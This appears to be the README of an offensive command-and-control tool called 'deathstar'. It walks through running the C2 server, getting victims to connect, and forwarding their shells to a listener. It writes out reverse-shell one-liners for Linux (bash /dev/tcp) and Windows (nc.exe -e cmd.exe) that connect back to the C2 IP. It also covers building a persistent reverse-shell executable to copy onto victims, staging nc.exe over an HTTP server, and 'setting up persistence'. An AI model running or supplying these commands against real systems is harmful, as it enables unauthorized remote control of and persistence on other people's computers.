# deathstar
Build and understand C2 infrastructure.

`Deathstar` has a webpage, or a CLI based C2 connection manager.

`stardestroyer.py` is the "preffered" option to connecting to the C2 server.

`converter.sh` will convert `stardestroyer.py` into an EXE.

# Web based C2
![image](https://github.com/user-attachments/assets/e01272a6-1e5a-416c-8b56-45460317a349)

# CLI based C2
![image](https://github.com/user-attachments/assets/e574c863-f44f-47fb-ad8a-7c3148b247e2)

# Download deathstar

```git clone github.com/bwithe/deathstar```

# Web C2 server 
1. Start the server
    - `python3 deathstar-web.py`
2. Open link in web browser
    - `firefox 127.0.0.1:5000`
3. Have Victim connect to C2
    - Linux / MacOS
      - BASH
      - This will drop the moment the C2 server 'drops'
          - `bash -i >& /dev/tcp/<C2-IP>/9999 0>&1`
      - Python reverse shell
          - This will continue to connect to the C2 server even after it 'drops'
          - Modify the 'SERVER_IP = ' in `stardestroyer.py`   
          - `bash converter.sh stardestroyer.py`
          - Copy `stardestoryer` to VICTIM
          - `chmod +x stardestroyer`
          - `./stardestroyer`
    - Windows
        - NETCAT
        - This will drop the moment the C2 server 'drops'
            - `C:\Windows\Temp\nc.exe -e cmd.exe $C2-IP 9999`
        - If your C2 OS is Kali, you can host a python http.server with nc.exe and run `stardestroyer.ps1`
            - On Kali
                - `find / -name nc.exe 2>/dev/null`
                - `sudo cp /usr/share/windows-resources/binaries/nc.exe .`
                - `python3 -m http.server 80`
            - On Windows
                - Powershell.exe
                - `.\stardestroyer.ps1`
4. Start your listener 
    - `nc -nvlp 4444`
5. Forward the connection to your listener
    - On the webpage, type the IP of the listening device, and select an OS from the drop down, then click forward.
6. Catch the connection
    - Once you've caught the connection, begin setting up persistence.
7. Wash, rince, repeat.

# CLI C2 server
1. Start the server
    - `python3 deathstar-term.py`
2. Have Victim connect to C2
    - Linux / MacOS
      - BASH
      - This will drop the moment the C2 server 'drops'
          - `bash -i >& /dev/tcp/<C2-IP>/9999 0>&1`
      - Python reverse shell
          - This will continue to connect to the C2 server even after it 'drops'
          - Modify the 'SERVER_IP = ' in `stardestroyer.py`   
          - `bash converter.sh stardestroyer.py`
          - Copy `stardestoryer` to VICTIM
          - `chmod +x stardestroyer`
          - `./stardestroyer`
    - Windows
        - NETCAT
        - This will drop the moment the C2 server 'drops'
            - `C:\Windows\Temp\nc.exe -e cmd.exe $C2-IP 9999`
        - If your C2 OS is Kali, you can host a python http.server with nc.exe and run `stardestroyer.ps1`
            - On Kali
                - `find / -name nc.exe 2>/dev/null`
                - `sudo cp /usr/share/windows-resources/binaries/nc.exe .`
                - `python3 -m http.server 80`
            - On Windows
                - Powershell.exe
                - `.\stardestroyer.ps1`
3. Start your listener 
    - `nc -nvlp 4444`
4. Forward the connection to your listener
    - On the CLI, list the connections.
      - Select `2)` to forward.
      - Specify the `ID` of the `VICTIM` you'd like to forward.
      - Then, type the IP of your `LISTENING` device.
5.Catch the connection
    - Once you've caught the connection, begin setting up persistence.
6. Wash, rince, repeat.

